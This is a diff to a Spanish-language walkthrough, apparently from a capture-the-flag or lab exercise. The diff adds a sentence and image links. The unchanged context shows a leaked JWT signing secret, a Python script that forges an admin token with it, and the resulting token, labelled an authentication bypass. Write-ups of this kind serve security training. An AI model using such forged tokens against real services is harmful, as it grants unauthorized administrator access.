@@ -135,6 +135,8 @@ secret='RrXCv`mrNe!K!4+5`wYq'
 ```
 ![zip](zip.png)
 
+Ahora teniendo esta key podemos generar un JWT asi que nos creamos un script en python
+
 Bypass de Autenticación JWT
 Generar Token JWT
 ```
@@ -144,7 +146,10 @@ secret = 'RrXCv`mrNe!K!4+5`wYq'
 token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256')
 print(f"Token: {token}")
 ```
+![key](key.png)
+
 Token generado:
+
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
 ```
